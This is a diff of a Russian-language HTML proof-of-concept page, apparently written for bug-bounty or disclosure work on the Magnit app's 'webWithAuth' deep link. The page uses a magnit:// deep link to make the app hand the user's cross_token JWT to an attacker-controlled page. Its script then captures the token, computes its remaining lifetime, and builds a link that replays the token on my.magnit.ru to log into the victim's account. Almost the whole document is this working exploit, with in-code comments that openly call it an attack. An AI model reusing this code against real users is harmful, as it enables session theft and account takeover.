@@ -1,38 +1,96 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8"> 
+<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PoC</title>
+<title>PoC | cross_token → my.magnit.ru</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body { font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif; background: #f5f6f8;
          display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-  .box { width: 100%; max-width: 420px; padding: 24px; text-align: center; }
-  .btn { display: block; width: 100%; padding: 18px; border: none; border-radius: 12px; 
-         font-size: 17px; font-weight: 600; color: #fff; background: #e30611; cursor: pointer; text-decoration: none; }
+  .box { width: 100%; max-width: 440px; padding: 24px; text-align: center; }
+  .btn { display: block; width: 100%; padding: 18px; border: none; border-radius: 12px;
+         font-size: 17px; font-weight: 600; color: #fff; background: #e30611; cursor: pointer; text-decoration: none; margin: 10px 0; }
+  .btn.green { background: #0a7d32; }
+  .btn.dark { background: #23262a; font-size: 13px; padding: 10px; }
   .btn:active { transform: scale(0.98); }
-  #leak { display: none; margin-top: 20px; padding: 16px; border: 2px solid #e30611; border-radius: 12px;
-          background: #fff0f0; font-size: 16px; font-weight: 600; color: #a30000; word-break: break-all; }
+  #leak, #go { display: none; margin-top: 18px; padding: 16px; border-radius: 12px; }
+  #leak { border: 2px solid #e30611; background: #fff0f0; }
+  #go { border: 2px solid #0a7d32; background: #ecfdf2; }
+  .tok { word-break: break-all; font-family: Consolas, monospace; font-size: 11px; background: #fff;
+         border: 1px solid #e30611; border-radius: 8px; padding: 10px; margin: 10px 0; text-align: left; }
+  .label { font-size: 12px; font-weight: 700; text-transform: uppercase; color: #6b7280; margin: 12px 0 4px; text-align: left; }
+  input { width: 100%; padding: 10px; font-size: 13px; border: 1px solid #d9dce1; border-radius: 8px; }
+  .ttl { font-size: 14px; font-weight: 700; color: #b26a00; margin-top: 8px; }
+  .note { font-size: 11px; color: #6b7280; text-align: left; margin-top: 8px; line-height: 1.45; }
 </style>
 </head>
 <body>
   <div class="box">
-    <a class="btn" id="btn" href="#">Открыть через Магнит</a>
-    <div id="leak">Перехвачено: <span id="tok"></span></div>
+
+    <!-- Состояние 1: кнопка запуска атаки -->
+    <a class="btn" id="btnAttack" href="#">Открыть через Магнит</a>
+    <div class="note">Кликаешь → Магнит подставляет cross_token в URL этой страницы → страница перезагружается.</div>
+
+    <!-- Состояние 2: токен перехвачен -->
+    <div id="leak">
+      <b style="color:#a30000;">Токен перехвачен</b>
+      <div class="tok" id="tok"></div>
+      <div class="ttl" id="ttl"></div>
+    </div>
+
+    <!-- Состояние 3: переход в аккаунт -->
+    <div id="go">
+      <div class="label">Целевой URL (куда подставить токен)</div>
+      <input id="target" value="https://my.magnit.ru/">
+      <a class="btn green" id="btnGo" href="#" target="_blank" rel="noopener">Перейти в аккаунт</a>
+      <div class="note">Откроется <code>цель?cross_token=&lt;JWT&gt;</code> в новой вкладке.
+      Если сервис принимает токен — ты в аккаунте. Работает только пока токен жив (TTL ~60 c).</div>
+    </div>
+
+    <a class="btn dark" id="btnReset" href="#">Сбросить (заново)</a>
+
   </div>
 
- 
 <script>
 (function () {
   var origin = location.protocol + "//" + location.host + location.pathname;
-  var dl = "magnit://webWithAuth?url=" + encodeURIComponent(origin) + "&in_app=false";
-  document.getElementById("btn").href = dl;
 
-  var tok = new URLSearchParams(location.search).get("cross_token");
-  if (tok) {
-    document.getElementById("tok").textContent = tok;
+  // ---- Кнопка атаки: deep link на эту же страницу ----
+  var dl = "magnit://webWithAuth?url=" + encodeURIComponent(origin) + "&in_app=false";
+  var btnAttack = document.getElementById("btnAttack");
+  btnAttack.href = dl;
+
+  // ---- Перехват токена ----
+  var qs = new URLSearchParams(location.search);
+  var token = qs.get("cross_token");
+
+  if (token) {
     document.getElementById("leak").style.display = "block";
+    document.getElementById("tok").textContent = token;
+    document.getElementById("go").style.display = "block";
+    document.getElementById("btnAttack").style.display = "none";
+
+    // Реконструкция TTL по exp из payload (если это JWT)
+    var ttl = "-";
+    try {
+      var payload = JSON.parse(atob(token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/")));
+      if (payload.exp) {
+        ttl = Math.max(0, Math.floor(payload.exp - Date.now() / 1000)) + " c осталось";
+      }
+    } catch (e) { /* не JWT — просто показываем без TTL */ }
+    document.getElementById("ttl").textContent = "TTL: " + ttl;
+
+    // ---- Переход в аккаунт: целевой URL + cross_token ----
+    function buildTarget() {
+      var t = document.getElementById("target").value.trim();
+      if (!t) return "";
+      return t + (t.indexOf("?") >= 0 ? "&" : "?") + "cross_token=" + encodeURIComponent(token);
+    }
+    document.getElementById("btnGo").href = buildTarget();
+    document.getElementById("target").addEventListener("input", function () {
+      document.getElementById("btnGo").href = buildTarget();
+    });
   }
 })();
 </script>
